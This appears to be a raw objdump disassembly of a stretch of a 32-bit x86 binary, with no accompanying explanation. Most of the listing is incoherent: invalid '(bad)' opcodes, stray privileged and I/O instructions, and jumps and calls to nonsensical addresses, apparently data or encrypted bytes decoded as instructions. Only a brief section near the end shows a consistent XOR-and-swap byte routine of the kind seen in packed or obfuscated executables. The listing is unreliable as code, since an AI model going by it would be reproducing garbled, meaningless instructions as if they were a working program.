  40c213:	and    DWORD PTR [edx],0x9a034ba8
  40c219:	enter  0x751e,0x83
  40c21d:	cdq    
  40c21e:	loope  0x40c228
  40c220:	fwait
  40c221:	mov    cl,0x41
  40c223:	inc    ebp
  40c224:	adc    BYTE PTR [ebp-0x1399de66],bh
  40c22a:	stos   DWORD PTR es:[edi],eax
  40c22b:	mov    ds:0x24fe1602,eax
  40c230:	dec    edx
  40c231:	iret   
  40c232:	adc    eax,esi
  40c234:	sbb    dl,cl
  40c236:	add    eax,eax
  40c238:	sub    edx,DWORD PTR [ebp-0x54575448]
  40c23e:	jae    0x40c206
  40c240:	sbb    dl,BYTE PTR [edi-0x669a5aaf]
  40c246:	adc    bl,bl
  40c248:	push   eax
  40c249:	push   0x5d
  40c24b:	je     0x40c20c
  40c24d:	inc    edx
  40c24e:	push   ebx
  40c24f:	adc    bl,al
  40c251:	arpl   WORD PTR [edx],bp
  40c253:	xchg   esi,eax
  40c254:	or     ebx,esi
  40c256:	sub    ch,dh
  40c258:	inc    ebp
  40c259:	(bad)  
  40c25a:	fnstenv [ebx+0x53]
  40c25d:	cmp    al,0xee
  40c25f:	adc    esi,ebx
  40c261:	pop    ebp
  40c262:	sbb    ebp,DWORD PTR [edx]
  40c264:	or     ebx,edx
  40c266:	pop    eax
  40c267:	in     eax,0xd6
  40c269:	jne    0x40c2c7
  40c26b:	xchg   BYTE PTR ds:0x239fd50c,al
  40c271:	out    0x91,al
  40c273:	inc    ebp
  40c274:	push   esi
  40c275:	cld    
  40c276:	cmp    ebx,DWORD PTR [eax+0x5d]
  40c279:	ds jl  0x40c24b
  40c27c:	out    dx,eax
  40c27d:	pop    esi
  40c27e:	or     eax,0x4acfd548
  40c283:	mov    DWORD PTR [edx+0x6c50d2e8],ebp
  40c289:	xor    ah,al
  40c28b:	rol    dl,0xe0
  40c28e:	sub    BYTE PTR [ebx-0x49a7cf15],0x67
  40c295:	aaa    
  40c296:	(bad)  
  40c298:	dec    edx
  40c299:	xor    BYTE PTR [esi],ch
  40c29b:	adc    DWORD PTR [eax],esp
  40c29d:	cdq    
  40c29e:	mov    bl,bl
  40c2a0:	sbb    dh,BYTE PTR [ebp-0x2e3648d0]
  40c2a6:	mov    cl,0xc8
  40c2a8:	aas    
  40c2a9:	dec    ecx
  40c2aa:	adc    eax,DWORD PTR [ebx-0x63]
  40c2ad:	sbb    DWORD PTR [esp+edi*1-0x33a6c058],ecx
  40c2b4:	ins    DWORD PTR es:[edi],dx
  40c2b5:	sbb    eax,0xa78ca81
  40c2ba:	(bad)  
  40c2bb:	adc    al,0x29
  40c2bd:	inc    edi
  40c2be:	pop    esi
  40c2bf:	stos   DWORD PTR es:[edi],eax
  40c2c0:	mov    ch,0x77
  40c2c2:	arpl   WORD PTR [esi-0x682fcc91],bp
  40c2c8:	jge    0x40c2a3
  40c2ca:	mov    ds:0xaf7d6172,eax
  40c2cf:	es icebp 
  40c2d1:	imul   ecx,DWORD PTR ss:[edx+0x60cee0ec],0xf001f7a2
  40c2dc:	jnp    0x40c300
  40c2de:	stc    
  40c2df:	cwde   
  40c2e0:	sti    
  40c2e1:	pusha  
  40c2e2:	fcom   DWORD PTR [edi+eax*2-0x39]
  40c2e6:	or     al,0xbc
  40c2e8:	push   es
  40c2e9:	push   eax
  40c2ea:	test   eax,0x976daa3a
  40c2ef:	test   eax,0x8e3c2cfd
  40c2f4:	call   0x59bf2afa
  40c2f9:	rcl    DWORD PTR [ebx+eax*4+0x78],0x23
  40c2fe:	imul   ecx,eax,0xffffffea
  40c301:	stos   BYTE PTR es:[edi],al
  40c302:	stc    
  40c303:	sub    ah,BYTE PTR [esp+edx*2-0x41]
  40c307:	push   esp
  40c308:	mov    WORD PTR [edi+0x2c4d9fcc],?
  40c30e:	cli    
  40c30f:	test   BYTE PTR [ebx+0x29e7113],al
  40c315:	out    0x98,eax
  40c317:	icebp  
  40c318:	es (bad) 
  40c31a:	jg     0x40c37e
  40c31c:	aam    0x3f
  40c31e:	fistp  DWORD PTR [esi-0x2bd3c248]
  40c324:	(bad)  
  40c325:	je     0x40c369
  40c327:	mov    dh,0x19
  40c329:	xor    bl,cl
  40c32b:	mov    bl,0x9f
  40c32d:	in     al,0x65
  40c32f:	lea    esi,[edx-0x2db1b5ac]
  40c335:	es test al,0xd9
  40c338:	aam    0x76
  40c33a:	jmp    DWORD PTR [ebp-0xff74213]
  40c340:	push   cs
  40c341:	sub    esi,DWORD PTR [ebx+0x22]
  40c344:	pop    esp
  40c345:	xor    DWORD PTR [esi],esp
  40c347:	icebp  
  40c348:	and    DWORD PTR [eax-0x29],edi
  40c34b:	arpl   WORD PTR [esi-0x2f494250],di
  40c351:	jmp    0x58b0:0x52637784
  40c358:	int    0x1e
  40c35a:	sub    eax,0x99d42f69
  40c35f:	arpl   WORD PTR [ecx-0x72],cx
  40c362:	sbb    al,0xc3
  40c364:	scas   eax,DWORD PTR es:[edi]
  40c365:	imul   edx,ebx,0x48549edd
  40c36b:	stc    
  40c36c:	(bad)  
  40c36d:	fnsave [edi-0x15226d9a]
  40c373:	stos   DWORD PTR es:[edi],eax
  40c374:	sub    dh,BYTE PTR [esi]
  40c376:	shl    BYTE PTR [esi+0x22d9a0cb],0xfb
  40c37d:	repnz int 0x67
  40c380:	mov    ch,0xa2
  40c382:	mov    dh,0xaa
  40c384:	push   esi
  40c385:	jo     0x40c3de
  40c387:	jae    0x40c37a
  40c389:	sub    eax,ebp
  40c38b:	adc    BYTE PTR [esi+0x40],ah
  40c38e:	push   ecx
  40c38f:	pop    ecx
  40c390:	aam    0xa2
  40c392:	test   DWORD PTR [ebx-0x4c],esp
  40c395:	imul   edi,DWORD PTR ds:0x11413c17,0x42
  40c39c:	iret   
  40c39d:	mov    ebx,DWORD PTR [ebp+0x75]
  40c3a0:	xchg   ebp,eax
  40c3a1:	inc    edi
  40c3a2:	or     bh,BYTE PTR [ebx+ecx*2+0x4e]
  40c3a6:	cld    
  40c3a7:	inc    esi
  40c3a8:	push   0x67c93dc7
  40c3ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ae:	add    DWORD PTR [edi],edx
  40c3b0:	cdq    
  40c3b1:	test   al,0x40
  40c3b3:	pop    esp
  40c3b4:	add    dl,BYTE PTR [edx+eiz*2-0x553b4f55]
  40c3bb:	xchg   DWORD PTR [edi+edi*8+0x51cf1239],edx
  40c3c2:	jne    0x40c39b
  40c3c4:	jl     0x40c404
  40c3c6:	cmp    DWORD PTR [esi+edi*1+0x3fa74f36],esp
  40c3cd:	gs adc esi,edi
  40c3d0:	mov    esp,0xe73b5753
  40c3d5:	fwait
  40c3d6:	jnp    0x40c3ce
  40c3d8:	sti    
  40c3d9:	jge    0x40c3fd
  40c3db:	add    al,0x4a
  40c3dd:	adc    bh,BYTE PTR [ecx+0x6c]
  40c3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3e1:	add    eax,0x499a1563
  40c3e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e7:	mov    dl,BYTE PTR [ebx-0x58]
  40c3ea:	add    BYTE PTR [esi],bl
  40c3ec:	ficom  DWORD PTR [edx-0x68]
  40c3ef:	aas    
  40c3f0:	jecxz  0x40c420
  40c3f2:	jnp    0x40c3d6
  40c3f4:	push   ebp
  40c3f5:	pusha  
  40c3f6:	cli    
  40c3f7:	enter  0x65ea,0xf6
  40c3fb:	test   eax,0xf5f902d7
  40c400:	(bad)  
  40c401:	sahf   
  40c402:	add    al,0xcf
  40c404:	outs   dx,DWORD PTR ds:[esi]
  40c405:	lods   al,BYTE PTR ds:[esi]
  40c406:	mov    edi,0x9c2c3d09
  40c40b:	lahf   
  40c40c:	add    DWORD PTR [eax+edi*2],0x1acbe48d
  40c413:	mov    ecx,DWORD PTR [ebp+0x7d294c4f]
  40c419:	dec    ebp
  40c41a:	fcom   st(6)
  40c41c:	lock daa 
  40c41e:	mov    ebx,0x6ac37a77
  40c423:	sub    eax,DWORD PTR [edx-0x402b8989]
  40c429:	xchg   edx,eax
  40c42a:	(bad)  
  40c42c:	icebp  
  40c42d:	out    0x91,al
  40c42f:	pop    ecx
  40c430:	out    0xf7,al
  40c432:	push   0xad839621
  40c437:	sti    
  40c438:	pop    ds
  40c439:	int3   
  40c43a:	imul   eax,esp,0xffffffc0
  40c43d:	rcr    esp,cl
  40c43f:	inc    esp
  40c440:	repnz xchg edi,eax
  40c442:	fdivr  QWORD PTR [edx+eiz*8-0x1ce2f943]
  40c449:	mov    ch,0x39
  40c44b:	xor    ah,BYTE PTR [ebx+0x66]
  40c44e:	fchs   
  40c450:	mov    eax,ds:0x1a98ec9e
  40c455:	sbb    BYTE PTR [ebp+0x3c1996aa],ah
  40c45b:	sub    esi,esi
  40c45d:	xchg   esp,eax
  40c45e:	xchg   BYTE PTR [edi+0x74],dl
  40c461:	push   ebx
  40c462:	jne    0x40c41b
  40c464:	pop    esi
  40c465:	pop    ds
  40c466:	mov    eax,DWORD PTR [ebp+0x79]
  40c469:	imul   esp,DWORD PTR [edx+0x7d4b1b6b],0xffffffee
  40c470:	pusha  
  40c471:	repnz mov esp,0x4c13bec8
  40c477:	jge    0x40c4aa
  40c479:	adc    BYTE PTR [esi+0x75],0xa1
  40c47d:	fs hlt 
  40c47f:	dec    esp
  40c480:	inc    esp
  40c481:	sbb    ah,BYTE PTR [edx]
  40c483:	and    al,0x39
  40c485:	dec    ebp
  40c486:	inc    eax
  40c487:	jge    0x40c447
  40c489:	pop    ds
  40c48a:	out    dx,al
  40c48b:	icebp  
  40c48c:	sub    eax,0xc0b0ba62
  40c491:	xchg   ecx,eax
  40c492:	mov    eax,ds:0x19ffd77
  40c497:	(bad)  
  40c498:	enter  0x41f1,0x3f
  40c49c:	pop    ds
  40c49d:	xchg   ebp,eax
  40c49e:	jg     0x40c4a1
  40c4a0:	out    0xe8,eax
  40c4a2:	mov    al,ds:0x4dbd7ca8
  40c4a7:	cmp    eax,0x6208893c
  40c4ac:	push   edi
  40c4ad:	inc    edx
  40c4ae:	aas    
  40c4af:	inc    ebp
  40c4b0:	sub    dl,BYTE PTR [edi]
  40c4b2:	cmp    eax,0x6769c989
  40c4b7:	enter  0xc052,0xec
  40c4bb:	pop    edi
  40c4bc:	pusha  
  40c4bd:	imul   eax,DWORD PTR [ebp+0x2e],0x7
  40c4c1:	mov    ah,0x9a
  40c4c3:	test   al,0x82
  40c4c5:	int    0x32
  40c4c7:	sub    BYTE PTR [edi+0x37f7df38],bh
  40c4cd:	in     al,0x2e
  40c4cf:	mov    edx,0x5d7049a
  40c4d4:	scas   al,BYTE PTR es:[edi]
  40c4d5:	pop    esp
  40c4d6:	jns    0x40c4e3
  40c4d8:	or     edx,DWORD PTR [ebp+0x73578123]
  40c4de:	pop    edi
  40c4df:	pop    ebp
  40c4e0:	pushf  
  40c4e1:	or     al,0x1b
  40c4e3:	call   DWORD PTR [ebp-0x1f]
  40c4e6:	in     eax,0xc6
  40c4e8:	mov    eax,0x7f975598
  40c4ed:	push   0x7
  40c4ef:	mov    bl,0xb8
  40c4f1:	call   0xb6d2c1d1
  40c4f6:	fimul  WORD PTR [esi+eax*1+0x53]
  40c4fa:	pop    esi
  40c4fb:	mov    esp,0xafc18af7
  40c500:	adc    eax,DWORD PTR [ecx+0x2d]
  40c503:	add    cl,BYTE PTR [edx]
  40c505:	iret   
  40c506:	rol    DWORD PTR [eax+0x3a],0x73
  40c50a:	pop    ds
  40c50b:	ins    DWORD PTR es:[edi],dx
  40c50c:	jne    0x40c4d6
  40c50e:	push   ecx
  40c50f:	xor    DWORD PTR [eax-0x75],esp
  40c512:	sar    ecx,0xa6
  40c515:	mov    bh,bl
  40c517:	add    ebx,DWORD PTR [eax-0x55]
  40c51a:	or     BYTE PTR [ecx-0x59],cl
  40c51d:	mov    BYTE PTR [ebx-0x67e6824a],dl
  40c523:	dec    esi
  40c524:	mov    ebx,0xa287c17c
  40c529:	adc    esi,ecx
  40c52b:	(bad)  
  40c52c:	or     eax,0x6c818cbd
  40c531:	push   edx
  40c532:	mov    ecx,0x6e2358d9
  40c537:	and    ebp,edx
  40c539:	xchg   ebx,eax
  40c53a:	mov    edx,edx
  40c53c:	(bad)  
  40c53d:	out    0x6a,al
  40c53f:	pop    esp
  40c540:	sub    cl,BYTE PTR [ebx-0x2fcc17ab]
  40c546:	add    edx,DWORD PTR [ebp-0x14]
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0xec69733d,si
  40c55e:	sahf   
  40c55f:	outs   dx,DWORD PTR ds:[esi]
  40c560:	or     BYTE PTR [edi-0x3583836b],dl
  40c566:	jns    0x40c5e4
  40c568:	jl     0x40c59b
  40c56a:	(bad)  
  40c56b:	bound  ebp,QWORD PTR [edx]
  40c56d:	xchg   ebx,eax
  40c56e:	cmp    DWORD PTR [edx+0x66],ebx
  40c571:	xor    eax,0xd512eb22
  40c576:	mov    esi,0x6aa42f51
  40c57b:	shl    BYTE PTR ds:0xb717c84e,0xf2
  40c582:	(bad)  
  40c584:	xor    DWORD PTR [edi-0x5d],ebx
  40c587:	or     cx,WORD PTR [ecx]
  40c58a:	mov    al,ds:0x1db2051f
  40c58f:	fisttp QWORD PTR [ecx]
  40c591:	xor    DWORD PTR [edx],ebx
  40c593:	mov    bl,0x49
  40c595:	bswap  ecx
  40c597:	cmp    eax,0x6401e81e
  40c59c:	into   
  40c59d:	sti    
  40c59e:	(bad)  
  40c59f:	call   0xaa529422
  40c5a4:	call   0x7d12:0x1e7db90
  40c5ab:	xor    eax,0xe9e60a73
  40c5b0:	sub    BYTE PTR [ebp+edi*1-0x19aae3e5],ch
  40c5b7:	jp     0x40c59f
  40c5b9:	aad    0xad
  40c5bb:	retf   0x6010
  40c5be:	es stc 
  40c5c0:	inc    ecx
  40c5c1:	in     al,0x22
  40c5c3:	xor    al,BYTE PTR [edx+0x661af450]
  40c5c9:	sbb    bh,BYTE PTR [edi]
  40c5cb:	aam    0xd5
  40c5cd:	rcr    DWORD PTR [esi],1
  40c5cf:	sbb    BYTE PTR [eax],ah
  40c5d1:	popa   
  40c5d2:	dec    ebp
  40c5d3:	mov    DWORD PTR es:[ebx-0x20],eax
  40c5d7:	in     eax,0xe1
  40c5d9:	test   al,0x1d
  40c5db:	ins    DWORD PTR es:[edi],dx
  40c5dc:	adc    DWORD PTR [ebx-0x66],eax
  40c5df:	loopne 0x40c60b
  40c5e1:	and    BYTE PTR [ebx],bh
  40c5e3:	jge    0x40c58b
  40c5e5:	jp     0x40c57b
  40c5e7:	leave  
  40c5e8:	outs   dx,DWORD PTR ds:[esi]
  40c5e9:	jge    0x40c573
  40c5eb:	loopne 0x40c667
  40c5ed:	push   esp
  40c5ee:	lods   al,BYTE PTR ds:[esi]
  40c5ef:	adc    al,0x1d
  40c5f1:	js     0x40c59b
  40c5f3:	lahf   
  40c5f4:	pop    ecx
  40c5f5:	out    0x77,eax
  40c5f7:	into   
  40c5f8:	in     al,dx
  40c5f9:	mov    ds:0x5cbc3597,eax
  40c5fe:	sub    eax,0x351bdbcd
  40c603:	daa    
  40c604:	fnstsw WORD PTR [eax+0x39]
  40c607:	lea    eax,[ecx]
  40c609:	jg     0x40c630
  40c60b:	mov    ds:0x4fd40c37,eax
  40c610:	mov    ecx,0xa75004e0
  40c615:	jmp    0x2cde:0x936beb1f
  40c61c:	and    cl,BYTE PTR [ecx-0x6d66783b]
  40c622:	mov    ch,0x93
  40c624:	cli    
  40c625:	push   ebx
  40c626:	stos   BYTE PTR es:[edi],al
  40c627:	test   al,0x4d
  40c629:	cmp    bh,BYTE PTR [eax-0x61b149f4]
  40c62f:	lods   al,BYTE PTR ds:[esi]
  40c630:	xor    al,0x2e
  40c632:	hlt    
  40c633:	int3   
  40c634:	ja     0x40c649
  40c636:	daa    
  40c637:	cwde   
  40c638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c639:	pop    ebx
  40c63a:	fisttp DWORD PTR [edi+esi*2]
  40c63d:	les    ebx,FWORD PTR [ecx-0x44cbec65]
  40c643:	and    cl,BYTE PTR [esi+0x59]
  40c646:	popa   
  40c647:	jae    0x40c6a2
  40c649:	shl    BYTE PTR [eax-0x30],cl
  40c64c:	fstp   QWORD PTR [eax]
  40c64e:	adc    al,0xc8
  40c650:	dec    esp
  40c651:	mov    esi,0x96aef2fb
  40c656:	push   ecx
  40c657:	jbe    0x40c67b
  40c659:	stos   BYTE PTR es:[edi],al
  40c65a:	mov    WORD PTR [ebx+0x23618c6e],?
  40c660:	push   ss
  40c661:	lods   eax,DWORD PTR ds:[esi]
  40c662:	push   0xb3fd112c
  40c667:	inc    ecx
  40c668:	stos   BYTE PTR es:[edi],al
  40c669:	add    al,0xd4
  40c66b:	mov    eax,ds:0xbf1e79fc
  40c670:	sbb    al,0x9d
  40c672:	inc    eax
  40c673:	ins    DWORD PTR es:[edi],dx
  40c674:	and    DWORD PTR [ecx],edx
  40c676:	lods   eax,DWORD PTR ds:[esi]
  40c677:	add    ah,bl
  40c679:	ficom  WORD PTR [esi-0x16]
  40c67c:	mov    DWORD PTR [edi+0x69b88970],ecx
  40c682:	arpl   bx,di
  40c684:	rol    BYTE PTR [edi],cl
  40c686:	ds test eax,0xd4533703
  40c68c:	call   0x1070d345
  40c691:	and    edi,DWORD PTR [ebp+0x60596d84]
  40c697:	pop    es
  40c698:	and    eax,0x90ba8de1
  40c69d:	pop    esi
  40c69e:	stc    
  40c69f:	add    bl,bl
  40c6a1:	dec    edi
  40c6a2:	jae    0x40c717
  40c6a4:	ins    BYTE PTR es:[edi],dx
  40c6a5:	dec    ebp
  40c6a6:	gs jne 0x40c668
  40c6a9:	mov    al,0x53
  40c6ab:	into   
  40c6ac:	mov    eax,0xc6cb9357
  40c6b1:	mov    al,ds:0x3dfb2557
  40c6b6:	jb     0x40c6b9
  40c6b8:	aad    0xf4
  40c6ba:	sti    
  40c6bb:	sbb    eax,edi
  40c6bd:	xchg   ecx,eax
  40c6be:	dec    esi
  40c6bf:	js     0x40c722
  40c6c1:	add    esi,DWORD PTR [esi-0x7756c10]
  40c6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c8:	jns    0x40c697
  40c6ca:	push   eax
  40c6cb:	mov    edx,0x12ca357c
  40c6d0:	inc    edi
  40c6d1:	test   eax,0xb2187678
  40c6d6:	cld    
  40c6d7:	pushf  
  40c6d8:	jb     0x40c693
  40c6da:	je     0x40c70f
  40c6dc:	mov    edx,DWORD PTR [esp+edi*8-0x39]
  40c6e0:	sub    DWORD PTR [esi-0x3b],esp
  40c6e3:	and    bh,dl
  40c6e5:	(bad)  
  40c6e6:	dec    DWORD PTR [eax]
  40c6e8:	std    
  40c6e9:	sub    bl,cl
  40c6eb:	fwait
  40c6ec:	(bad)  
  40c6ed:	test   al,0xed
  40c6ef:	scas   al,BYTE PTR es:[edi]
  40c6f0:	cmp    al,bh
  40c6f2:	pop    ecx
  40c6f3:	imul   ebx,DWORD PTR [edx],0x60
  40c6f6:	scas   al,BYTE PTR es:[edi]
  40c6f7:	idiv   BYTE PTR [ebx+0x23]
  40c6fa:	add    dh,cl
  40c6fc:	fwait
  40c6fd:	out    dx,al
  40c6fe:	call   0x8aa8c8e4
  40c703:	js     0x40c6e9
  40c705:	pop    edi
  40c706:	xchg   DWORD PTR [esi-0x7c6c84a],ebp
  40c70c:	ins    BYTE PTR es:[edi],dx
  40c70d:	dec    ecx
  40c70e:	sbb    al,0xb7
  40c710:	push   edx
  40c711:	repz dec edi
  40c713:	inc    edi
  40c714:	loopne 0x40c6ec
  40c716:	xchg   edi,eax
  40c717:	(bad)  
  40c718:	jle    0x40c717
  40c71a:	jecxz  0x40c6be
  40c71c:	pop    edi
  40c71d:	mov    bh,0xf6
  40c71f:	loope  0x40c753
  40c721:	mov    esp,ds
  40c723:	inc    edi
  40c724:	sub    edx,DWORD PTR [edi+0x1232dfbb]
  40c72a:	mov    ecx,0x3ef86280
  40c72f:	mov    ah,0x82
  40c731:	add    cl,al
  40c733:	sahf   
  40c734:	fsubr  QWORD PTR [ecx+0x1d9481a9]
  40c73a:	sub    eax,0x22a82f1
  40c73f:	sub    eax,0xf7b806b5
  40c744:	jne    0x40c77b
  40c746:	add    al,0xe9
  40c748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c749:	(bad)  
  40c74a:	push   esp
  40c74b:	fcomp  st(1)
  40c74d:	push   0x3d4e6f51
  40c752:	mov    bl,0x30
  40c754:	push   ds
  40c755:	dec    edx
  40c756:	(bad)  
  40c758:	pop    es
  40c759:	dec    esi
  40c75a:	xchg   ebx,eax
  40c75b:	ret    
  40c75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c75d:	lahf   
  40c75e:	jno    0x40c7bb
  40c760:	mov    bl,0xae
  40c762:	outs   dx,BYTE PTR ds:[esi]
  40c763:	fild   QWORD PTR [eax]
  40c765:	cmp    al,0xf
  40c767:	mov    bl,0x45
  40c769:	add    eax,0x6a6b46da
  40c76e:	add    al,0x41
  40c770:	sti    
  40c771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c772:	mov    dl,0xe6
  40c774:	ins    DWORD PTR es:[edi],dx
  40c775:	cmp    DWORD PTR [ebx-0x156dedf6],esp
  40c77b:	xor    eax,0xd4e3d5a8
  40c780:	das    
  40c781:	mov    DWORD PTR [edi+eiz*8+0x76efbbc2],eax
  40c788:	pop    ss
  40c789:	loop   0x40c7d9
  40c78b:	mov    eax,ds:0x4b64d8d1
  40c790:	dec    eax
  40c791:	repz int 0x5e
  40c794:	jmp    0x40c80a
  40c796:	pop    edi
  40c797:	clc    
  40c798:	dec    edx
  40c799:	into   
  40c79a:	lahf   
  40c79b:	dec    edi
  40c79c:	cmp    dh,BYTE PTR ds:0x9f4c3fbf
  40c7a2:	add    al,0x3f
  40c7a4:	or     esi,DWORD PTR [edx+0x69]
  40c7a7:	jmp    0x114f:0xc5a3c2a4
  40c7ae:	xchg   ebx,eax
  40c7af:	addr16 aas 
  40c7b1:	sbb    DWORD PTR [edi+0x2b],eax
  40c7b4:	pusha  
  40c7b5:	out    dx,al
  40c7b6:	inc    ebp
  40c7b7:	nop
  40c7b8:	inc    edx
  40c7b9:	xchg   BYTE PTR [edi-0x43],dh
  40c7bc:	out    dx,al
  40c7bd:	dec    esi
  40c7be:	xor    dl,bh
  40c7c0:	(bad)  
  40c7c1:	xor    al,0xe6
  40c7c3:	pcmpeqw mm7,mm6
  40c7c6:	xor    DWORD PTR [edi],ecx
  40c7c8:	(bad)  
  40c7c9:	cmp    esp,DWORD PTR [edi]
  40c7cb:	imul   esi,DWORD PTR [eax-0x591a5b6f],0x7
  40c7d2:	scas   eax,DWORD PTR es:[edi]
  40c7d3:	add    BYTE PTR ds:0x7329c3f0,dh
  40c7d9:	jmp    0xde1d:0xa4dbed91
  40c7e0:	xlat   BYTE PTR ds:[ebx]
  40c7e1:	xor    BYTE PTR [ebp+ebp*2-0x6856a693],0x83
  40c7e9:	into   
  40c7ea:	pop    esi
  40c7eb:	pop    ebp
  40c7ec:	(bad)  
  40c7ed:	(bad)  
  40c7ee:	sbb    al,0xc0
  40c7f0:	cwde   
  40c7f1:	imul   esi,esp,0xffffffa8
  40c7f4:	(bad)  
  40c7f5:	push   edx
  40c7f6:	nop
  40c7f7:	inc    esp
  40c7f8:	out    dx,eax
  40c7f9:	mov    eax,ds:0x553b911f
  40c7fe:	push   ds
  40c7ff:	pusha  
  40c800:	shl    DWORD PTR [esi+ebx*2],0x7c
  40c804:	test   DWORD PTR [eax+0x1e],edi
  40c807:	in     al,dx
  40c808:	xchg   ebp,eax
  40c809:	test   DWORD PTR [ebp+0x53],ecx
  40c80c:	pop    edx
  40c80d:	pop    eax
  40c80e:	or     BYTE PTR [ebp-0x1d04b54a],bh
  40c814:	or     DWORD PTR [esi+0x1ecaec83],esp
  40c81a:	lods   eax,DWORD PTR ds:[esi]
  40c81b:	fstp   QWORD PTR [esp+ecx*4-0x51]
  40c81f:	test   DWORD PTR [ebp-0x40],ebp
  40c822:	test   DWORD PTR [eax-0x15],ebx
  40c825:	push   es
  40c826:	cmc    
  40c827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c828:	dec    eax
  40c829:	sbb    eax,0xc3923cb
  40c82e:	mov    dh,0xf0
  40c830:	in     al,dx
  40c831:	ror    DWORD PTR es:[ecx+0xd],0x55
  40c836:	cmp    bl,bl
  40c838:	(bad)  
  40c839:	fisttp WORD PTR [esi-0x7b97e71c]
  40c83f:	call   0x3902:0xc92544c1
  40c846:	xor    BYTE PTR [esi-0x2ff61836],ch
  40c84c:	cmp    edi,0x30
  40c84f:	dec    BYTE PTR [esi-0x42]
  40c852:	xor    al,0x46
  40c854:	xor    ah,bl
  40c856:	in     al,dx
  40c857:	inc    eax
  40c858:	pusha  
  40c859:	loop   0x40c87b
  40c85b:	ss xchg ebp,eax
  40c85d:	mov    cl,0x2e
  40c85f:	in     al,dx
  40c860:	inc    edx
  40c861:	aam    0x96
  40c863:	fnstenv [eax-0x1d]
  40c866:	mov    cs,WORD PTR [esi-0x4e]
  40c869:	inc    ah
  40c86b:	xor    bl,BYTE PTR [ebx-0x67]
  40c86e:	mov    ebx,0xb50fa03
  40c873:	pop    es
  40c874:	lea    ebp,[ebx+0x21328254]
  40c87a:	mov    al,0xa0
  40c87c:	push   es
  40c87d:	mov    esi,0x4840fff9
  40c882:	jb     0x40c831
  40c884:	mov    dl,0x18
  40c886:	aad    0xc2
  40c888:	inc    edx
  40c889:	fs and al,0x91
  40c88c:	mov    bl,0xa6
  40c88e:	cmp    ebp,DWORD PTR [ebx+esi*1]
  40c891:	cs inc edx
  40c893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c894:	xchg   esp,eax
  40c895:	pop    es
  40c896:	jne    0x40c8cc
  40c898:	add    DWORD PTR [ebp-0x2b47f1df],edx
  40c89e:	add    al,0x5f
  40c8a0:	inc    esi
  40c8a1:	loopne 0x40c85f
  40c8a3:	inc    edx
  40c8a4:	shl    BYTE PTR [ecx+0x14],1
  40c8a7:	cdq    
  40c8a8:	pop    es
  40c8a9:	cdq    
  40c8aa:	mov    ebp,0x58e680b6
  40c8af:	pop    esi
  40c8b0:	pop    eax
  40c8b1:	jo     0x40c916
  40c8b3:	jmp    0xebea3ff6
  40c8b8:	ins    DWORD PTR es:[edi],dx
  40c8b9:	xor    bh,ah
  40c8bb:	(bad)  
  40c8bc:	cdq    
  40c8bd:	sahf   
  40c8be:	fmul   QWORD PTR [edx+0x729a3a94]
  40c8c4:	xor    al,BYTE PTR [eax]
  40c8c6:	mov    BYTE PTR [ebp+0xf],dl
  40c8c9:	mov    edx,DWORD PTR [ebp-0xc]
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	xchg   DWORD PTR [ebx],esp
  40c925:	fist   DWORD PTR [edi]
  40c927:	ins    DWORD PTR es:[edi],dx
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c95a
  40c930:	and    eax,0xdbd634f6
  40c935:	popf   
  40c936:	and    BYTE PTR [eax-0x29],al
  40c939:	mov    esi,0x251cfeb8
  40c93e:	push   ebp
  40c93f:	inc    edx
  40c940:	xlat   BYTE PTR ds:[ebx]
  40c941:	pop    esi
  40c942:	aas    
  40c943:	jbe    0x40c921
  40c945:	sbb    al,0x88
  40c947:	sub    edi,edi
  40c949:	ss pushf 
  40c94b:	dec    eax
  40c94c:	daa    
  40c94d:	std    
  40c94e:	sub    cl,ch
  40c950:	or     DWORD PTR [edi],eax
  40c952:	or     ch,BYTE PTR [ebx+edi*4+0x579f6f6d]
  40c959:	fwait
  40c95a:	mov    BYTE PTR [ebp+0x3],bl
  40c95d:	push   esp
  40c95e:	loop   0x40c8e7
  40c960:	pop    esp
  40c961:	rcl    BYTE PTR [ebp+eiz*2+0x6b46667c],0xaf
  40c969:	jle    0x40c955
  40c96b:	loop   0x40c9cb
